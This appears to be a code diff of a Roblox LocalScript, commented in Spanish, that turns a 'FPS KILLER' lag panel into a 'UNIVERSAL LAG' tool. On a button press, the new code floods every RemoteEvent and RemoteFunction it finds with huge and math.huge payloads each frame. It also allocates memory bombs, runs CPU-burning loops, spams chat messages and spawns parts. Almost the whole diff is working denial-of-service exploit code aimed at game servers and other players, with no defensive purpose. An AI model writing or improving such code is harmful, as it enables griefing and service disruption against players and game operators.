@@ -1,249 +1,229 @@
--- Panel GUI FPS KILLER para Roblox
--- Coloca este script en StarterPlayerScripts o ejecuta como LocalScript
-
 local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
-local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local UserInputService = game:GetService("UserInputService")
 
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
-local backpack = player:WaitForChild("Backpack")
 
--- Variables para el FPS Killer
-local isKillerActive = false
-local killerConnection = nil
-local equipConnections = {}
+local lagActive = false
+local connections = {}
 
--- Crear el GUI principal
+-- GUI (igual que antes)
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "FPSKillerPanel"
+screenGui.Name = "UniversalLag"
 screenGui.ResetOnSpawn = false
 screenGui.Parent = playerGui
 
--- Frame principal
-local mainFrame = Instance.new("Frame")
-mainFrame.Name = "MainFrame"
-mainFrame.Size = UDim2.new(0, 250, 0, 150)
-mainFrame.Position = UDim2.new(0.75, -125, 0.5, -75) -- Centrado en la parte derecha
-mainFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
-mainFrame.BorderSizePixel = 0
-mainFrame.Active = true
-mainFrame.Draggable = true
-mainFrame.Parent = screenGui
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 200, 0, 100)
+frame.Position = UDim2.new(0, 10, 1, -110)
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+frame.BorderSizePixel = 0
+frame.Parent = screenGui
 
--- Esquinas redondeadas
 local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0, 12)
-corner.Parent = mainFrame
+corner.CornerRadius = UDim.new(0, 8)
+corner.Parent = frame
 
--- Sombra
-local shadow = Instance.new("Frame")
-shadow.Name = "Shadow"
-shadow.Size = UDim2.new(1, 6, 1, 6)
-shadow.Position = UDim2.new(0, -3, 0, -3)
-shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-shadow.BackgroundTransparency = 0.7
-shadow.ZIndex = mainFrame.ZIndex - 1
-shadow.Parent = mainFrame
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 30)
+title.BackgroundTransparency = 1
+title.Text = "UNIVERSAL LAG"
+title.TextColor3 = Color3.fromRGB(255, 100, 100)
+title.TextScaled = true
+title.Font = Enum.Font.GothamBold
+title.Parent = frame
 
-local shadowCorner = Instance.new("UICorner")
-shadowCorner.CornerRadius = UDim.new(0, 12)
-shadowCorner.Parent = shadow
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(0.9, 0, 0, 40)
+button.Position = UDim2.new(0.05, 0, 0, 50)
+button.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+button.Text = "ACTIVATE LAG"
+button.TextColor3 = Color3.fromRGB(255, 255, 255)
+button.TextScaled = true
+button.Font = Enum.Font.Gotham
+button.Parent = frame
 
--- Título
-local titleLabel = Instance.new("TextLabel")
-titleLabel.Name = "Title"
-titleLabel.Size = UDim2.new(1, 0, 0, 40)
-titleLabel.Position = UDim2.new(0, 0, 0, 0)
-titleLabel.BackgroundTransparency = 1
-titleLabel.Text = "⚡ PANEL DE CONTROL"
-titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-titleLabel.TextScaled = true
-titleLabel.Font = Enum.Font.GothamBold
-titleLabel.Parent = mainFrame
-
--- Botón FPS KILLER
-local fpsKillerButton = Instance.new("TextButton")
-fpsKillerButton.Name = "FPSKillerButton"
-fpsKillerButton.Size = UDim2.new(0.8, 0, 0, 50)
-fpsKillerButton.Position = UDim2.new(0.1, 0, 0.4, 0)
-fpsKillerButton.BackgroundColor3 = Color3.fromRGB(220, 53, 69)
-fpsKillerButton.BorderSizePixel = 0
-fpsKillerButton.Text = "🔥 FPS KILLER"
-fpsKillerButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-fpsKillerButton.TextScaled = true
-fpsKillerButton.Font = Enum.Font.GothamBold
-fpsKillerButton.Parent = mainFrame
-
--- Esquinas del botón
 local buttonCorner = Instance.new("UICorner")
-buttonCorner.CornerRadius = UDim.new(0, 8)
-buttonCorner.Parent = fpsKillerButton
+buttonCorner.CornerRadius = UDim.new(0, 4)
+buttonCorner.Parent = button
 
--- Label de estado
-local statusLabel = Instance.new("TextLabel")
-statusLabel.Name = "Status"
-statusLabel.Size = UDim2.new(1, 0, 0, 25)
-statusLabel.Position = UDim2.new(0, 0, 0.75, 0)
-statusLabel.BackgroundTransparency = 1
-statusLabel.Text = "Estado: Inactivo"
-statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-statusLabel.TextScaled = true
-statusLabel.Font = Enum.Font.Gotham
-statusLabel.Parent = mainFrame
-
--- Función para obtener todos los tools
-local function getAllTools()
-    local tools = {}
-    
-    -- Tools en el backpack
-    for _, tool in pairs(backpack:GetChildren()) do
-        if tool:IsA("Tool") then
-            table.insert(tools, tool)
-        end
-    end
-    
-    -- Tool equipado actualmente
-    if player.Character then
-        for _, tool in pairs(player.Character:GetChildren()) do
-            if tool:IsA("Tool") then
-                table.insert(tools, tool)
-            end
-        end
-    end
-    
-    return tools
-end
-
--- Función para equipar/desequipar tools rápidamente (causa lag)
-local function fpsKillerLoop()
-    local tools = getAllTools()
-    
-    if #tools == 0 then
-        return
-    end
-    
-    -- Equipar todos los tools muy rápido
-    for i = 1, #tools do
-        spawn(function()
-            local tool = tools[i]
-            if tool and tool.Parent == backpack then
-                tool.Parent = player.Character
-                wait(0.01) -- Muy poco tiempo para causar lag
-                if tool and tool.Parent == player.Character then
-                    tool.Parent = backpack
-                end
-            end
-        end)
-    end
-    
-    -- Crear múltiples loops simultáneos para más lag
-    for i = 1, 5 do
-        spawn(function()
-            for _, tool in pairs(tools) do
-                if tool then
+-- Métodos más universales
+local function universalRemoteSpam()
+    return RunService.Heartbeat:Connect(function()
+        if not lagActive then return end
+        
+        -- Buscar TODOS los remotes en el juego
+        local function spamRemotes(parent)
+            for _, obj in pairs(parent:GetChildren()) do
+                if obj:IsA("RemoteEvent") then
                     spawn(function()
-                        tool.Parent = player.Character
-                        tool.Parent = backpack
-                        tool.Parent = player.Character
-                        tool.Parent = backpack
+                        for i = 1, 200 do
+                            pcall(function()
+                                obj:FireServer(
+                                    string.rep("LAG", 2000),
+                                    math.huge,
+                                    Vector3.new(math.huge, math.huge, math.huge),
+                                    CFrame.new(math.huge, math.huge, math.huge),
+                                    workspace,
+                                    player,
+                                    {}
+                                )
+                            end)
+                        end
+                    end)
+                elseif obj:IsA("RemoteFunction") then
+                    spawn(function()
+                        for i = 1, 100 do
+                            pcall(function()
+                                obj:InvokeServer(string.rep("X", 5000))
+                            end)
+                        end
                     end)
                 end
+                
+                if obj:GetChildren() then
+                    spamRemotes(obj)
+                end
+            end
+        end
+        
+        spamRemotes(ReplicatedStorage)
+        spamRemotes(workspace)
+        spamRemotes(game.StarterPack)
+    end)
+end
+
+local function memoryBomb()
+    return RunService.Heartbeat:Connect(function()
+        if not lagActive then return end
+        
+        -- Crear tablas masivas que consumen RAM
+        spawn(function()
+            local bigData = {}
+            for i = 1, 50000 do
+                bigData[i] = {
+                    data = string.rep("LAGBOMB", 500),
+                    numbers = {},
+                    nested = {}
+                }
+                
+                for j = 1, 100 do
+                    bigData[i].numbers[j] = math.random() * 999999
+                    bigData[i].nested[j] = string.rep(tostring(math.random()), 50)
+                end
             end
         end)
-    end
+    end)
 end
 
--- Función para iniciar/detener el FPS Killer
-local function toggleFPSKiller()
-    if isKillerActive then
-        -- Detener
-        isKillerActive = false
-        if killerConnection then
-            killerConnection:Disconnect()
-            killerConnection = nil
+local function cpuKiller()
+    return RunService.Heartbeat:Connect(function()
+        if not lagActive then return end
+        
+        -- Múltiples threads de cálculos intensivos
+        for thread = 1, 20 do
+            spawn(function()
+                for i = 1, 10000 do
+                    local result = 0
+                    for j = 1, 1000 do
+                        result = result + math.sin(i) * math.cos(j) * math.tan(i+j)
+                        result = result ^ 0.5
+                        result = math.floor(result * math.random())
+                    end
+                end
+            end)
         end
+    end)
+end
+
+local function networkFlooder()
+    return RunService.Heartbeat:Connect(function()
+        if not lagActive then return end
         
-        -- Limpiar conexiones
-        for _, connection in pairs(equipConnections) do
-            connection:Disconnect()
-        end
-        equipConnections = {}
-        
-        fpsKillerButton.Text = "🔥 FPS KILLER"
-        fpsKillerButton.BackgroundColor3 = Color3.fromRGB(220, 53, 69)
-        statusLabel.Text = "Estado: Inactivo"
-        statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-    else
-        -- Iniciar
-        isKillerActive = true
-        
-        -- Ejecutar el loop en RenderStepped para máximo lag
-        killerConnection = RunService.RenderStepped:Connect(function()
-            fpsKillerLoop()
+        -- Intentar múltiples métodos de red
+        spawn(function()
+            -- Método 1: Chat spam (si está disponible)
+            pcall(function()
+                for i = 1, 100 do
+                    game.StarterGui:SetCore("ChatMakeSystemMessage", {
+                        Text = string.rep("LAG", 1000);
+                        Color = Color3.fromRGB(255, 0, 0);
+                        Font = Enum.Font.Gotham;
+                        FontSize = Enum.FontSize.Size18;
+                    })
+                end
+            end)
+            
+            -- Método 2: Bindable events
+            pcall(function()
+                local bindable = Instance.new("BindableEvent")
+                for i = 1, 1000 do
+                    bindable:Fire(string.rep("DATA", 1000))
+                end
+                bindable:Destroy()
+            end)
         end)
+    end)
+end
+
+local function tryCreateObjects()
+    return RunService.Heartbeat:Connect(function()
+        if not lagActive then return end
         
-        -- También ejecutar en Heartbeat
-        table.insert(equipConnections, RunService.Heartbeat:Connect(function()
-            fpsKillerLoop()
-        end))
+        -- Intentar crear objetos donde sea posible
+        local locations = {workspace, player.PlayerGui, player.Backpack}
         
-        -- Y en Stepped para triple efecto
-        table.insert(equipConnections, RunService.Stepped:Connect(function()
-            spawn(fpsKillerLoop)
-        end))
+        for _, location in pairs(locations) do
+            spawn(function()
+                pcall(function()
+                    for i = 1, 100 do
+                        local part = Instance.new("Part")
+                        part.Name = "LagPart" .. tick()
+                        part.Size = Vector3.new(0.1, 0.1, 0.1)
+                        part.Transparency = 1
+                        part.CanCollide = false
+                        part.Anchored = true
+                        part.Position = Vector3.new(math.random(-5000, 5000), math.random(1000, 5000), math.random(-5000, 5000))
+                        part.Parent = location
+                        
+                        game:GetService("Debris"):AddItem(part, 0.1)
+                    end
+                end)
+            end)
+        end
+    end)
+end
+
+local function toggleLag()
+    lagActive = not lagActive
+    
+    if lagActive then
+        button.Text = "STOP LAG"
+        button.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
         
-        fpsKillerButton.Text = "🛑 DETENER"
-        fpsKillerButton.BackgroundColor3 = Color3.fromRGB(40, 167, 69)
-        statusLabel.Text = "Estado: ACTIVO - Causando Lag"
-        statusLabel.TextColor3 = Color3.fromRGB(255, 69, 58)
+        -- Activar todos los métodos
+        table.insert(connections, universalRemoteSpam())
+        table.insert(connections, memoryBomb())
+        table.insert(connections, cpuKiller())
+        table.insert(connections, networkFlooder())
+        table.insert(connections, tryCreateObjects())
+        
+        warn("UNIVERSAL LAG ACTIVATED!")
+    else
+        button.Text = "ACTIVATE LAG"
+        button.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+        
+        for _, connection in pairs(connections) do
+            if connection then
+                connection:Disconnect()
+            end
+        end
+        connections = {}
+        
+        print("Lag stopped")
     end
 end
 
--- Conectar el botón
-fpsKillerButton.MouseButton1Click:Connect(toggleFPSKiller)
-
--- Efectos de hover en el botón
-fpsKillerButton.MouseEnter:Connect(function()
-    local tween = TweenService:Create(fpsKillerButton, 
-        TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
-        {Size = UDim2.new(0.85, 0, 0, 55)}
-    )
-    tween:Play()
-end)
-
-fpsKillerButton.MouseLeave:Connect(function()
-    local tween = TweenService:Create(fpsKillerButton, 
-        TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
-        {Size = UDim2.new(0.8, 0, 0, 50)}
-    )
-    tween:Play()
-end)
-
--- Hacer que el panel aparezca con animación
-mainFrame.Size = UDim2.new(0, 0, 0, 0)
-mainFrame.Position = UDim2.new(0.75, 0, 0.5, 0)
-
-local appearTween = TweenService:Create(mainFrame,
-    TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
-    {
-        Size = UDim2.new(0, 250, 0, 150),
-        Position = UDim2.new(0.75, -125, 0.5, -75)
-    }
-)
-appearTween:Play()
-
--- Funcionalidad para cerrar con tecla X (opcional)
-UserInputService.InputBegan:Connect(function(input, gameProcessed)
-    if gameProcessed then return end
-    
-    if input.KeyCode == Enum.KeyCode.X then
-        if isKillerActive then
-            toggleFPSKiller()
-        end
-        screenGui:Destroy()
-    end
-end)
-
-print("Panel FPS KILLER cargado. Presiona X para cerrar el panel.")
+button.MouseButton1Click:Connect(toggleLag)
